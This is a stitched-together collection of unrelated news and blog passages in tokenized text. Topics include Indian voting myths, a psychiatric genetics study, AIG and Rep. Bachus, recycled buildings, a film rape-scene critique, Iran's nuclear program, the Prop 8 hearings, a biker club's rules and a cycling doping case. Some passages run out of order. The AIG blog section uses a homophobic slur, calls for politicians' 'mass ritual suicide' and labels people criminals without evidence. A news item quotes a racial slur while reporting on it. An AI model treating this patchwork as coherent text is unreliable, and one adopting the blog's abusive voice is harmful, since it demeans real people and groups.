This applies to Muslims as much as it applies to Sikhs in Delhi , Hindu pundits in Indian - administered Kashmir and to Bengalis in north - eastern India .
But it is simply not true that there is anything like a Muslim bloc at national level .
If there is one striking thing about Indian Muslims , it is the fact that unlike most minorities in most democracies around the world , Indian Muslims have not voted for Muslim parties .
They have had their preferred political parties - Congress used to be one of those parties , and now there are many .
Also , Muslims in India do not vote en bloc like , say , the black vote in the US for the Democratic Party or the UK 's ethnic minorities who largely vote for the Labour Party .
Politically speaking , there is no single unified Muslim community in India .
Muslims are fragmented along the lines of religion , sect , caste and community .
In the past two decades , Muslim voters have chosen different parties in different states : the CPI ( M ) in Bengal , the RJD in Bihar , the regional Samajwadi Party ( SP ) in Uttar Pradesh , the DMK party in Tamil Nadu and the Congress in other parts of the country .
In other words , it is an exaggeration to say there is one unified Muslim vote in the country .
THE YOUNG VOTE DISTINCTLY AND INDEPENDENTLY
There is a perception that youth constitute a distinct political bloc with unique and independent political preferences and views .
Two - thirds of Indians are below the age of 35 .
The young are no more politically active than others
That itself is no basis for concluding that the young are distinct and different from the rest of the population in terms of their political opinions , attitudes and behaviour .
I guess we tend to talk about " youth voters " because we import our vocabulary of political analysis from Europe where the generational divide is a significant political cleavage of that society .
Where a party like the Greens primarily rides on the divide of the young versus the old .
This myth also feeds on a perception that youth are supposed to be carriers of change and transformation .
The evidence in India , however , does not confirm any of these beliefs .
There is no evidence to suggest that the young are politically more active than others .
If anything , they are less politically active - obviously they have other anxieties in life , like preparing for a professional career .
Indians allow their image of the young to be dominated by the image of the city - bred English - speaking youth , which is very different from the rest of the country .
But we forget that this is a tiny slice of Indian youth .
There is no systematic difference between the manner in which the young and the not - so - young vote .
It is true that in many states political parties that are relatively more recent or young tend to get more votes from young people .
But that is only a function of political socialisation : simply because the young were more exposed to that party than people of an older generation who had not even heard its name .
Even in terms of opinions , we have simply not found anything like a generational cleavage in Indian politics .
The young support democracy in much the same way as the old do .
The young are about as traditional and conservative as the old .
Even on questions like inter - caste marriage , the opinions of the young are not actually very different from the rest of the population .
HIGH TURNOUT LEADS TO DEFEAT FOR THE RULING PARTY
It is simply a coincidence that the era which has witnessed higher voter turnout at the federal and state level is also the era which has witnessed a higher level of volatility - a tendency for voters to switch from one party to another , leading to ruling governments or incumbent representatives losing the election .
Turnout in village council elections is more than 80 %
But there is little evidence to suggest that there is a linkage between the two .
It is simply not true that elections that witness high turnout lead to a loss for the ruling party .
Take the latest case of Madhya Pradesh .
In the state elections last year there was a record turnout .
Some analysts saw it as evidence of the ruling BJP being thrown out .
The BJP won the polls again .
High voter turnout can be a function of many different things - a spontaneous outpouring of the voters , of intensity of political competition , of greater mobilisation and resources put in by political parties or of greater interest on the part of the voter .
So depending on what led to the higher turnout , you would have different consequences of it .
THERE IS WIDESPREAD APATHY TOWARDS POLITICS
This is one myth that comes close to being totally false .
The fact is that while in many other democracies in the world , voter turnouts have declined , in India turnouts have either remained stable or have gone up .
If we look at political associations , Indians have an amazingly intense attachment to politics .
The proportion of people attached to one party , who feel close to a party , is much higher in India than in many other democracies .
The proportion of people who are members of a political party is much higher in India than in the US and most European democracies .
There has been a participatory upsurge for democracy in India
The proportion of voters who report that they took some part in electoral activity - going to meetings or campaigning - is quite robust .
And the number of people who report that someone came to their house to canvass for votes is very high .
In advanced democracies , as you come down the various tiers - from national to local elections - the turnout of voters goes down .
In India , it is exactly the opposite : the turnout in federal elections tends to be around 60 % , in the state elections it is around 70 % and when it comes to village council elections it is anything upwards of 80 % .
Most important , our democracy defies what was once considered a law of political participation in the world : the higher up you are in the socio- economic hierarchy , the more you participate in politics and voting .
In India , evidence shows that the poor " untouchables " vote more than upper castes .
The poor vote as much , if not more , than the urban middle classes .
Rural areas vote more than urban areas .
Women vote almost as much as men do .
In other words there is no connection between social hierarchy and participation in politics .
Rather than voter apathy and indifference , there has been a participatory upsurge for democracy in India .
INDIANS DON'T CAST THEIR VOTE , THEY VOTE THEIR CASTE
It is true that caste is one of the major determinants of voting behaviour in India .
In certain situations when voters are extremely polarised , it appears to be to the sole consideration .
But the fact is that caste is not quite the sole consideration .
It is certainly untrue that defeat and victory for political parties in elections can be explained by a few caste or community groups switching sides from one party to another .
The turnout among untouchables is high
The reason many feel that caste is powerful is because we use the phrase " caste based vote bank " to mean many things .
In Delhi 's politics , the expression " Punjabi " ( literally , residents of Punjab or people who speak the Punjabi language ) is used as if it is a caste .
Actually , it is a linguistic group .
People use the word " Bihari " ( literally , residents of Bihar ) as if it is a caste group .
Actually , it is a regional affiliation , or a moniker for poor migrants .
A caste vote can also be a vote against a candidate of a voter 's own caste in favour of a party considered closer to their caste .
So if a person belonging to the Yadav caste in Bihar votes for a Congress party candidate because the candidate is a Yadav himself , it is an example of caste voting .
If the same person were to vote for a candidate belonging to the Bhumihar caste put up by the regional Rashtriya Janata Dal ( RJD ) - which largely represents the Yadav caste - it would be also an example of caste voting .
The evidence on caste voting suggests that caste tends to be a major determinant , specially among the large , visible and powerful caste groups .
The caste - vote trend is towards voting for a party that is considered to be close to their caste or community group .
But the fact remains that most voters in most constituencies in India do not have a simple option of voting along caste lines .
Either they have more than one candidate from their own caste or they have none .
They simply cannot vote according to their caste .
There has to be a consideration other than caste for almost three - quarters of the voters .
Caste provides us with good information on the initial affiliations of social groups .
But across two elections , the increasing votes for one party or defeat of another is not explained by castes changing sides .
When a party goes up in popularity or declines in popularity , it usually wins and loses votes across castes .

The exact causes of many psychiatric illnesses are not known , and few risk factors exist for many of them .
Scientists have long been trying to decipher the genetic from environmental factors that influence the development of psychiatric illnesses .
Many studies have reported that certain mental illnesses run in families , but are there common genetic causes , or are they distinct pathologies ?
Now , a new study in The Lancet may shed some light on the genetic link between bipolar disorder and schizophrenia .
This Swedish study evaluated more than 9 million Swedes from the population register from 1973 to 2004 , and compared it to the public hospital discharge register showing all public psychiatric admissions in Sweden .
The population encompassed more than 2 million nuclear families .
The researchers assessed the data for the risk of schizophrenia , bipolar disorder , and their comorbidity in biological and adoptive parents and offspring , as well as siblings and half - siblings .
Overall , the results indicated that individuals with a first - degree relative with one of these disorders were at an increased risk for developing either disorder .
Full siblings of first - degree relatives with either schizophrenia or bipolar disorder were 9 times more likely than the general population to develop schizophrenia and 8 times more likely to develop bipolar disorder during their lifetime .
Half siblings also had an increased risk compared to the general population , but not as high as full siblings .
Maternal half siblings were 3.6 times more likely to develop schizophrenia and 4.5 times more likely to develop bipolar disorder compared to the general population .
Paternal half siblings had an even lower risk , at 2.7 times higher risk of schizophrenia and 2.4 times higher risk of bipolar disorder .
Interestingly , an increased risk of psychiatric illness exists in children – both adopted and biological – of parents with either bipolar disorder or schizophrenia .
This led the researchers to conclude that , while there is a strong genetic component to these illnesses , environment also plays a factor .
The portion of schizophrenia that is inherited genetically is 64 % , and the portion of bipolar disorder that is inherited genetically is 59 % .
Approximately 63 % of the causes of the cormorbidity of the two disorders is inherited genetically .
This is not the first study to show common causes and genetic links between bipolar disorder and schizophrenia .
A large Danish register - based cohort study , similar to the current Swedish study , found similar results .
People with first - degree relatives with schizoaffective disorder , schizophrenia , and bipolar disorder showed a significantly increased risk for developing any of the same diseases .
A relative with bipolar disorder was the strongest risk factor for developing bipolar disorder , and a minor risk factor for developing schizophrenia , and a relative with schizophrenia was the strongest risk factor for developing schizophrenia , and a minor risk factor for developing bipolar disorder .
Several studies have proven that the same brain abnormalities exist in bipolar disorder and schizophrenia .
Specifically , reductions in the white matter of the brain of patients with schizophrenia and bipolar disorder point towards shared mechanisms in the disease causes and pathology .
Also , bipolar disorder and schizophrenia share several variations of genetic loci .
Each illness also has its own unique genetic variations .
Schizophrenia affects approximately 1 % of the adult population in the United States .
Its symptoms include distorted thought and hallucinations , delusions , and disorganized speech and thinking , leading significant social dysfunction .
Bipolar disorder affects more than 2 % of the adult population in the United States and is a mood disorder that includes episodes of extreme elevated mood and depressive episodes or symptoms .
Few risk factors other than family history have been identified for either disease .
The results of the current Swedish study is helping to redefine the signs , symptoms , and underlying structure of psychiatric illness .
More accurate identification , diagnosis , and treatment begin with more knowledge of the causes and common disease pathways .
Other researchers and authors have already challenged the diagnostic criteria in the American Psychiatric Association ’s Diagnostic and Statistical Manual of Mental Disorders , as well as the World Health Organization ’s International Classification of Disease .
The new diagnostic criteria must account for the measurement and review of psychopathology to more effectively monitor current and future treatments .

The rankest member of the Financial Services Committee
For several weeks now and even today , we continue to play kind of a game that children used to play , pin the tail on the donkey , trying to put the blame somewhere else .
[ He leaves that for his wingnut colleague from Georgia , Tom Price , who followed him today . ]
And in truth , there 's plenty of blame to go around .
AIG , the company , engaged in very reckless , risky behavior , and I think we all have the right to be angered that such a fine company at one time has been -- is in the mess that it's in and the effect that it 's had on our economy .
That 's justified anger .
So we could certainly pin the donkey on AIG and those within that company , most all of them long gone who caused that .
Washington , the regulators , they failed to do their job .
We ought to blame them .
That 's justified .
This Congress , some of our policies have contributed to some of that behavior , the failure to regulate , the failure of oversight by this Congress .
We 're to blame .
The one people who probably are n't to blame , but seem to be paying the tab is the American people .
They 're paying for all this bad behavior by the company , all this bad behavior by our failure to regulate , all the failure of us to take action in numerous different areas .
We all should bear the blame .
But I think , at this point , that anger should n't distract us from really the true issue and our goal today , and that 's to try to recover as much of the taxpayers ' money as we possibly can .
That ought to be our motive and the blame game needs to be secondary , because we 're all to blame .
Now , the only possible successful outcome to this is to manage our way out of the current problems .
Now , how do we do that ?
Do you think Congress can manage AIG ?
I do n't think so .
Take a walk through the visitor center ; three times over budget , five years late .
We can't manage AIG .
How about the regulators ?
There are a lot of empty desks at Treasury .
I do n't think that the Fed or the Treasury has done a very good job .
How about a poll on TV ?
Should we just take some poll results and act from there ?
I do n't think so .
As unpopular as it may be , I think the best opportunity that we have is to let that new team at AIG -- and we 're all upset over the bonuses .
The bonuses were awarded and signed as contracts in 2007 , long before Mr. Liddy and the new team was in play , and we 're justifiably angry at him for maybe not doing a better job of getting out of it .
But he came in after the collapse of AIG , with a $ 1 salary , and you can vilify this new management team if it makes you feel better , but resolving a company as large and as complex as AIG is no easy task .
It was in a mess and it will require a lot of good fortunate ..
It will require an economic recovery .
And that 's what they 're doing now .
They 're unraveling the deals .
They 're shutting down this financial products division that has caused all of us heartbreak and harm , and that 's going to take time .
The people who set the policies that brought AIG to the brink of total collapse are gone .
We need to give this new management team the time it needs to get the job done .
They were assigned that job in September and when we did it and when the Fed did it , they said it would take two years or three years to do it .
The government trying to get more involved than it is is just going to be a sad experience .
We need to let -- as I say , we need to -- and I close by , again , saying the solution here is not government running this company .
It 's a private team and they 're going to need all the help they can get .
The last time Edward Liddy faced a vexing compensation issue , as chief executive of Northbrook - based Allstate Corp. , he cut costs with all the finesse of a blunderbuss :
He axed 6,000 of Allstate 's highest - paid agents .
That was then , this is now .
As head of insurance giant AIG , which is 80 percent owned by taxpayers , Liddy seems to be going all wobbly on compensation issues .
In March 2007 , just two months after I became the Chairman of the Financial Services Committee for the first time , I moved quickly to forge a bill which would regulate Fannie Mae and Freddie Mac .
The bill passed the House in May , with all 223 Democrats voting for it , and 103 Republicans voting against it .
President Bush later signed that legislation into law .
Later in 2007 , I introduced legislation to restrict subprime mortgages .
The bill passed the Financial Services Committee and the House , but it did not pass the Senate , where because of the filibuster rule , the Republican minority actually does have the power to hobble the majority .
The bill passed the full House with all 227 Democrats and 64 Republicans voting for it , and 127 Republicans voting against .
Ironically , those Republicans who now attack me most viciously and whose memories are the most impaired were among those who voted against both bills .
Republicans also forget -- or do not understand -- that the present financial crisis has many fathers .
The failure to pass any meaningful legislation before 2007 allowed unscrupulous actors to gorge themselves at the public 's expense .
Unregulated mortgage brokers sold subprime loans including the now infamous NINA ( No Income No Assets ) .
Major financial institutions packaged bad mortgages into securities and sold them as low - risk investments .
Rating agencies gave stellar grades to toxic assets while being paid by the companies who stood to benefit from their actions .
Insurance companies like AIG issued Credit Default Swaps which magically turned toxic assets into gold .
The executives of some of those institutions now seek bonuses for their fine work .
Perhaps my Republican colleagues should ask for bonuses too .
The political elite knows where it 's bread is buttered -- and at the same time , for a change -- fears the suddenly awakened voters .
The Republicans were not stupid to give Alabama reactionary Spencer Bachus the role of defending Liddy today .
Bachus has taken more legalized bribes ( $ 914,725 ) from the finance / insurance / real estate sector than any other Republican in the House other than Ron Paul , Eric Cantor and Mark Kirk .
Bachus ' central Alabama district -- carefully gerrymandered to exclude Africa - Americans -- is so deeply red ( PVI is R+25 ) that Democrats have n't even run a candidate against him in anyone 's memory .
Independents ran against him in 2004 and 2002 and Bachus got 99 % and 90 % of the vote .
Since then , no one ran against him .
Earlier today CQPolitics did a cute story -- similar to the oneran on March 1st about the district that gave Obama the least amount of support in November .
It was the all white , very backward Texas panhandle hellhole ( TX - 13 ) represented by Mac Thornberry .
Turns out Bachus ' district actually tied TX - 13 ... at 23 % .
He can do anything , short of saying he disagrees with Rush Limbaugh about something , and never worry about losing an election .
Let 's take a look at how he helped open today 's House Financial Services Committee hearing :
What makes it a " fine " company ?
All the campaign contributions it 's given to the political elite ?
The " very reckless , risky behavior " Bachus mentioned about AIG in passing ?
Is it a fine company in the same sense that Enron was the finest company George Bush had ever dealt with -- before their chairman -- and his campaign financial director -- went from " Kenny - boy " to " Ken who ?
" Bachus says anger towards " Washington , the regulators " is justified ; Congress too ... " the failure to regulate , the failure of oversight by this Congress . "
If I recall correctly , Bachus has not only supported every single anti-regulatory initiative that 's ever been brought before Congress since he was elected in 1992 , he led the way on many of the worst of them !
His party (+ the Blue Dog Democrats ) led the anti-regulatory mania that is more at fault for this catastrophe than any other single factor other , perhaps , than the unmitigated avarice ( the reason we need regulatory agencies ) of the predatory parasites at the heart of outlaw companies like AIG .
Bachus talks about how the American people are stuck with the tab -- the gargantuan tab -- because of " all this bad behavior by our failure to regulate . "
That 's correct .
Why did n't he stand up before the camera and take Chuck Grassley 's advice ?
Why do n't all the Republicans and all the Blue Dogs commit mass ritual suicide as a way of atoning for this disaster ?
Who would argue -- other than Bill O'Reilly -- that the country would n't be a far better place for it ?
And then that charade about who 's going to run it -- the government or Congress ?
No , Rep. Bachus ; but how about some honest executives -- ones , unlike Liddy , who are n't career criminals and congenital liars ?
Liddy has a reputation , a much - admired one , in the corporate world for his relentless cost cutting prowess .
That means he fires employees with great ruthlessness .
And it was n't just the 60 % of the workforce at Searle that he and Don Rumsfeld axed prior to selling the company to Monsanto .
Today ' sbrings up an incident from his days running Allstate , another bandit corporation , where he did n't care quite so much about the " sanctity " of contracts :
In rural Alabama , where they seem perfectly happy to re-elect a crustacean as their congressman 8 times , they 'll buy into the revelation that we better not run a big complicated company like AIG through public polling or by a much - disliked and inept Congress .
He thinks the " new team " at AIG needs to be given a chance .
team ?
" The people who set the policies that brought AIG to the brink of total collapse are gone , " fibbed Bachus .
" We need to give this new management team the time it needs to get the job done . "
Who got the $ 165 million inbonuses if this is the new team ?
One guy got $ 6.5 million .
Had they just hired him the week before ?
He must be good .
Watch Bachus sing for his supper -- and earn every cent of the $ 914,725 in corporate bribes from finance / insurance / real estate he 's been given : I 'm sure Chairman Frank and ranking member Bachus make herculean efforts to get along , even if Barney seems a little macho for an ankle - grabber like Bachus .
Today at Huffington Post , Barney addresses the question of selective / collective Republican amnesia .
Gentleman that he is , he never mentions Rep. Bachus ' name .

The aerial homes could be erected in a city setting , in the middle of a lake , or beside a cliff – with plenty of living space as well as room for advertising .
We ’ve featured some creative shipping container houses in the past , but Nuyaka Creek Winery in Oklahoma has reused a refrigerated truck trailer to construct an intriguing wine cellar underneath the elderberries .
The recycled building already keeps a cool temperature because of it ’s underground design , the insulated trailer ensures perfect wine !
Speaking of wine , the next time you ’re visiting Holland book a stay at the Hotel De Vrouwe van Stavoren and sleep inside a rescued wine barrel .
There are 4 of the recycled hotel rooms available , each furnished with 2 beds , a television , and a bathroom .
The wine barrels are set in a traditional hotel atmosphere with adjoining outdoor porches and fresh flowers .
Beer cans , rocks , hubcaps , and wires are just a few of the materials used to create Cano ’s Castle .
The UFO - looking structure is the recycled home of Native American Cano in Antonito , CO .
The intriguing beer can folk art was a 20 - year project of drinking and collecting junk .
It may have only lasted 3 days , but the World Environment Day 2005 project , ScrapHouse , is an amazing example of the possible options for recycled buildings .
After planning the design , the team of architects , engineers , and builders spent 3 weeks searching for rescued and reused materials and another 2 weeks building the exhibit .
Street signs , traffic lights , used conveyor belts , and fire hoses are just a few of the weird components used to manufacture the house .

Pixel in der Galerie is a spacious accommodation surrounded by the art of Thomas Feichtner .
The king - sized bed inside the gallery hotel room is also one of the artist ’s personal creations .
That minute or so is the finest thing in Observe and Report , and if it does n't strike you as funny - peculiar , you may as well stop reading now .
( Emphasis added . ) [ TIME ]
Now that 's character comedy , I mean tragedy , I mean tromedy , of the highest , I mean lowest , I mean high - lowest order .
Beyond the weirdness , if you can get there , is a quick portrait of trailer - park America pursuing its urges by any means necessary .
It 's clear that Ronnie , no babe magnet , will take what he can get on this night of nights , even if it 's not quite the exalted ecstasy he had hoped for ; and that Brandi , who 's been in this position once or twice before , wants the sexual exercise , even if she 's not awake to take an active role in it — somewhere in her stupor , she 's feeling a rote rumble of pleasure .
The scene achieves what few American movies even attempt : to pinpoint the grim compromise , the desperation , that can attend the sex act .
Do n't call it love ; do n't call it grand ; but whatever it is , do n't stop .
Here 's a scene to frighten the horses .
About an hour into Observe and Report , mall cop Ronnie Barnhardt ( Seth Rogen ) has finally achieved his dream and taken the blonde , egotistical , doltish perfume saleslady Brandi ( Anna Faris ) to bed , basically by getting her drunk .
Problem is , she 's pretty much passed out , her puke staining the pillow , as Ronnie happily , obliviously churns away .
He pauses for a moment to notice her comatose state , and without opening her eyes , Brandi mutters , " Why 'd you stop , malefactor ? "
Or a 12 - letter word to that effect .
Corliss 's review is really more of a review of the rape scene than a review of the movie .
In short , he loved it :
TIME film critic Richard Corliss delivers a review of the new comedy Observe & Report that 's as disturbing as the rape scene excerpted in the trailer .
Some have defended the scene on the grounds that Observe & Report is a dark comedy and Ronnie the bipolar mall cop is a cartoonishly unsympathetic character .
They argue that he 's funny because almost everything he does is so obviously wrong .
We laugh when he physically assaults people for no good reason .
So , why not laugh at the rape scene ?
But Seth Rogen 's understanding of the joke is entirely different :
When we 're having sex and she 's unconscious like you can literally feel the audience thinking , like , how the fuck are they going to make this okay ?
Like , what can possibly be said or done that I 'm not going to walk out of the movie theater in the next thirty seconds ? . . .
And then she says , like , the one thing that makes it all okay : " Why are you stopping , motherfucker ? "
Rogen is saying that the scene is a bait and switch :
We 're led to think Ronnie 's a date rapist , but at the last possible minute we realize that Brandi consented after all .
Psych !
That she 's drunk , drugged out , covered with her own vomit , and unconscious is never in doubt .
Rogen excels at a brand of awkwardness - based humor where much of the laughter is tension release .
Which means that the scene fails on its own terms , unless you believe that an unconscious person can consent .
Without the unexpected " evidence " of consent , it 's just a rape scene .
If you see the encounter as rape , Brandi 's slurred semi-conscious interjection just seems piteous .
It does n't make anything " okay . "
Corliss apparently relishes the sexual violence in the spirit Rogen intended .
Corliss also reaffirms the patriarchal nostrum that slutty women consent to sex by default .
He writes : " Brandi , who 's been in this position once or twice before , wants the sexual exercise , even if she 's not awake to take an active role in it — somewhere in her stupor , she 's feeling a rote rumble of pleasure . "
So , even when she 's unconscious , she 's asking for it .
Do n't even get me started on the " trailer park America " line -- as if substance abuse and sexual assault are just for working class people .
Tell that to the frat boys .
I have n't seen the movie , so I 'm not going to judge its merits as a film .
It 's possible that Corliss and Rogen are misinterpreting what writer - director Jody Hill is trying to do .
Maybe the scene is funny in context , despite being apparently morally reprehensible .
I mean , anything 's possible .
Regardless , Corliss 's review and Rogen 's commentary are chilling because they so casually reaffirm the stereotypes that perpetuate date rape .
Makes you wonder how many other people are in on the joke .
Iran has enough fissile material to build one nuclear bomb , the chairman of the US joint chiefs of staff said yesterday , underlining the gravity of the toughest foreign policy issue facing the Obama administration .
Admiral Mike Mullen told CNN that a nuclear - armed Iran would be a " very , very bad outcome " , apparently confirming a report by the UN 's nuclear watchdog that its uranium enrichment was more advanced than previously thought .
It was the first such public assessment of Iran 's nuclear capability by the US , though there was no indication whether it was based on independent intelligence .
Mullen 's remarks came after a report two weeks ago by the International Atomic Energy Agency ( IAEA ) , that said Tehran had made significant advances in enrichment .
It claimed an increase in Iran 's reported stockpile of low - enriched uranium at its Natanz plant since last November to 1,010 kg - technically enough , say some physicists , for conversion into high - enriched uranium for one bomb .
Asked if Iran had enough material to manufacture a bomb , Mullen said yesterday : " We think they do , quite frankly .
Iran having a nuclear weapon , I believe , for a long time , is a very , very bad outcome for the region and for the world . "
Iran insists it does not intend to build nuclear weapons but is pursuing its legitimate right to process uranium for power plants like the one at Bushehr on the Persian Gulf coast that was fired up in a trial run last week .
Israel , which has its own undeclared nuclear weapons arsenal , has been warning for some time that Iran is far closer than believed in the west to being able to build a bomb .
President Obama has repeatedly signalled that he wants diplomatic engagement with Tehran to defuse the " urgent problem " of the nuclear dispute .
But he has also hinted at tougher sanctions if Iran does not meet international demands .
He and Gordon Brown will discuss Iran in Washington this week .
Assessing Iran 's nuclear ambitions has a troubled history in the US .
In 2007 a National Intelligence Estimate concluded Iran had halted its programme in 2003 .
But that was widely questioned .
And even if true , there is no guarantee it has not restarted since .
Robert Gates , the US defence secretary , said separately yesterday that Iran was " not close " to obtaining a weapon .
" I think that there has been a continuing focus on how do you get the Iranians to walk away from a nuclear weapons programme .
They 're not close to a stockpile .
They 're not close to a weapon at this point , " he told NBC .
IAEA delegates are to discuss Iran at a meeting in Vienna today amid concern that it has been curbing inspections and making it harder to uncover any secret facilities .
AIST Introduces Sugar Cube - Sized Fuel Cell
February 19th , 2009 by Ariel Schwartz
The National Institute of Advanced Industrial Science and Technology ( AIST ) recently developed a surprisingly attractive solid - oxide fuel cell ( SOFC ) .
The sugar cube - sized SOFC , which is made up of 25 needle - like modules measuring 0.8 mm , packs a serious punch due to a high ratio of electrode area to volume .
And since small size means a small heat capacity , the module also has a low operating temperature .
While other SOFC ’s operate between 700 and 1,000° C , AIST ’s module works at only 500° C .
The fuel cell ’s low absolute value of thermal expansion also means a quick start - up time of five minutes or less .
The new SOFC will likely be used by automotive CPUs , but could one day provide power to fuel cell vehicles .
AIST ’s mini-fuel cell is currently on display at the 2009 International Nanotechnology Exhibition and Conference in Tokyo , Japan .

The California Supreme Court strongly indicated Thursday it would rule that Proposition 8 validly abolished the right for gays to marry but would allow same - sex couples who wed before the November election to remain legally married .
The long - awaited hearing , which came as dueling demonstrators chanted and carried banners outside , was a disappointment for gay rights lawyers .
They had hoped the same court majority that overturned the state ’s previous marriage ban would conclude that Proposition 8 was an impermissible constitutional revision .
Two members of that majority -- Chief Justice Ronald M. George and Justice Joyce L. Kennard -- expressed deep skepticism toward the gay rights lawyers ’ arguments .
Without their votes , Proposition 8 appeared almost certain to survive .
The other two justices who ruled in favor of marriage rights last year -- Carlos R. Moreno and Kathryn Mickle Werdegar -- seemed more open to the revision challenge .
Moreno even helped gay rights lawyers with their arguments .
But the court revealed no division on whether to uphold the marriages of an estimated 18,000 same - sex couples who wed before November .
Even Justice Marvin Baxter , the court ’s most conservative member , observed that the couples got married after receiving the right by “ the highest court of the state . ”
“ How can we deny the validity of those marriages ? ” Baxter asked .
The court ’s ruling is due within 90 days .
Gay marriage advocates all but conceded defeat .
Kate Kendell , executive director of the National Center for Lesbian Rights , which represented some of the plaintiffs , acknowledged that the court had appeared skeptical of their arguments .
“ I think conversations about going back to the ballot need to happen vigorously and strategically , ” Kendell said .
“ 2010 would be the next statewide ballot , and in campaign terms , that is just around the corner .
I just do n’t know whether we have the groundwork in place to mount such an effort or the financial resources . ”
A brisk business
The Proposition 8 campaign followed the California Supreme Court ’s landmark 4 - 3 ruling May 15 to overturn a ban on same - sex marriage .
Gay couples quickly lined up to marry , many of them from out of state .
The wedding business was brisk until Nov. 4 , when Proposition 8 passed with 52 % of the vote .
The two sides spent a total of more than $ 80 million , the most ever for an initiative about a social issue .
The legal challenges to the measure have been closely watched nationwide .
Both opponents and supporters of gay marriage flocked Thursday to the state building in San Francisco where the California Supreme Court is housed , each trying to drown out the other side with chants .
Gay rights lawyers had argued that Proposition 8 removed a fundamental right from a protected minority that has suffered discrimination .
As such , it revised the Constitution , instead of merely amending it , they said .
Revisions can be placed on the ballot only by a two - thirds vote of the Legislature or a constitutional convention .
Kennard , traditionally a strong supporter of gay rights , repeatedly noted that Proposition 8 was a mere 14 words and simply took away the “ label ” of marriage .
She reminded lawyers that the “ core ” part of last year ’s marriage ruling required the state to give sexual orientation the same constitutional protection as race and gender .
Proposition 8 “ has n’t destroyed equal protection , ” Kennard said .
“ I think what you are overlooking is the very broad powers of the people to amend the Constitution , ” she said .
She described the Proposition 8 case as “ completely different ” from last year ’s marriage cases and stressed that previous high court decisions “ do n’t support ” the challenges .
“ What I am picking up from this case is that the court should willy - nilly disregard the will of the people , ” Kennard said .
George also indicated that the elevated constitutional status of sexual orientation was more important than the “ mere designation ” of marriage .
He noted that the state ’s Constitution has been amended more than 500 times and asked whether the real problem was that “ it ’s just too easy to amend the California Constitution . ”
“ Maybe the solution has to be a political one , ” George said , and until the amendment process is changed , “ is n’t this the system we have to live with ? ”
When Werdegar , one of the more liberal members of the court , called the Proposition 8 case “ unique ” and observed that it raised unprecedented questions , George was quick to jump in .
“ It is not unique in the history of California that the initiative process has been used to restrict the right of one minority or another , ” said the chief justice , who wrote the May 15 landmark marriage ruling .
What if gays had won the right to marry by initiative and a later initiative took that right away ?
George asked .
“ Are you saying it is a one - way street -- that you can extend rights by way of initiative and take them away only by revision , the same rights ? ”
Exceptions have long been carved from equal protection guarantees , he said .
Justice Carol A. Corrigan also observed that people have the right to amend their constitutions : “ Is n’t the essence of democracy grounded in the right of people to govern themselves ? ”
Shannon Price Minter , a lawyer with the National Center for Lesbian Rights , countered that Proposition 8 stripped the marriage ruling of a “ core element ” : “ the right to be treated with equal dignity and respect . ”
The initiative did not merely take away the word “ marriage , ” he said .
“ Nomenclature is not the point , ” Minter added .
“ The point is equality . ”
Dealing with words
Justice Ming W. Chin raised an argument by some scholars that the court could uphold Proposition 8 but require the state to replace the term “ marriage ” with another name , such as “ civil union . ”
“ Is that a viable solution and is that really within the province of this court ? ” Chin asked skeptically .
Michael Maroko , representing one of the same - sex couples , was blunt .
“ If you ’re in the marriage business , do it equally , ” he said .
If same - sex couples cannot marry , “ then straight couples do n’t have that right either . ”
On the legality of existing marriages , Kennard noted that the Proposition 8 ballot argument said that only a marriage between a man and a woman would be recognized regardless of where or when performed .
But she said that language “ was buried in the middle of the rebuttal argument . ”
Pepperdine Law School Dean Kenneth Starr , who was hired for the case by the Proposition 8 campaign , urged the court to deny state recognition of existing same - sex marriages while leaving intact rights couples acquired during their marriages , such as inheritances .
“ Is that really fair to the people who depended on what this court said was the law of the land ? ” Chin asked .
George suggested that the Proposition 8 campaign might have been deliberately vague on how it would affect already married same - sex couples “ as a matter of strategy , political strategy . ”
Starr , realizing that he was making no headway , said facetiously : “ I see my argument is very persuasive . ”
The lawyer who fared the worst at Thursday ’s hearing was state Senior Assistant Atty .
Gen. Christopher Krueger , who argued that Proposition 8 should be overturned because it repealed an “ inalienable right ” without compelling justification .
Atty .
Gen. Jerry Brown came up with that novel legal theory after initially saying he would defend Proposition 8 .
The justices pressed Krueger to define an “ inalienable right . ”
“ How do we know what is an inalienable right ? ” Moreno asked .
“ Do we just know it when we see it ? ”
George noted that voters can amend the Constitution .
“ Is that an inalienable right ? ” he asked .
Kennard told Krueger that his argument relied on 19th century case law that was later overturned .
Starr described the attorney general ’s supporting cases as “ quaint . ”
After the hearing , gay rights lawyers who spoke at a news conference were largely drowned out by a raucous crowd waving signs and shouting , “ Stop the hate ! ” and “ Yes on 8 ! ”
San Francisco Chief Deputy City Atty .
Theresa Stewart , one of the lawyers in the case , said she was hopeful that the court would not “ sell our Constitution down the river . ”
But she also seemed to forecast defeat when she added : “ I have full confidence that we will eventually go back to the ballot box , and we will prevail . ”
Andrew P. Pugno , a lawyer for the Proposition 8 campaign , said he and supporters “ were very pleased how the argument went . ”
“ It appeared there was a broad understanding on the court that ultimately the inalienable right of the people to amend our Constitution will determine the outcome of the case , ” Pugno said .
He said he found it “ perplexing ” that the court appeared ready to uphold Proposition 8 and at the same time say “ that some gay marriages nevertheless will continue to be recognized . ”
“ Just on its face to the average person , that seems inconsistent , ” he said .

A MOTORCYCLE club had a rule that its members were not allowed to wear their colours while having sex with Aboriginal women , documents filed in the Northern Territory Supreme Court show .
The rules of the Blonks Motorcycle Club , filed with the NT's Registrar of Associations , stipulated that " due to past circumstances no colours to be worn when shafting gins and no gins to be brought to the house ever " .
The term " gin " to describe an indigenous woman is highly offensive to Aborigines .
The club 's rules were filed in the NT Supreme Court in an application by club member Paul Anthony Johnson to overturn an order of the NT Commissioner of Consumer Affairs that dissolved the club and seized its clubhouse and land .
The rules stipulated that " in the interests of peace among members , keep your hands off another woman if she is a member 's woman " .
Cycling News Flash , April 17 , 2009 Edited by Laura Weislo Hamilton tests positive , retires By Kirsten Robbins with additional reporting by Shane Stokes Tyler Hamilton has suffered from depression for years .
Photo © : Emory Ball Tyler Hamilton 's career in cycling has ended following a positive doping control , Cyclingnews learned Friday .
He tested positive for the banned steroid Dehydroepiandrosterone ( DHEA ) after an out - of - competition control in early February .
Hamilton admitted to knowingly taking the substance which was an ingredient in a vitamin supplement he took in an attempt to alleviate depression .
He has decided to retire .
" I took a banned substance so I need to take whatever penalty they will give me and move forward , " Hamilton said .
" Today is about my leaving the sport and to talk about my depression , not the past .
I do n't want to talk about that anymore , it 's about moving forward and taking care of myself . "
" My future in the sport is yet to be determined .
I 'll live with that .
I have officially retired right now , " Hamilton told Cyclingnews .
" Michael [ Rock Racing owner Michael Ball - ed. ] knows , but my teammates do n't know yet .
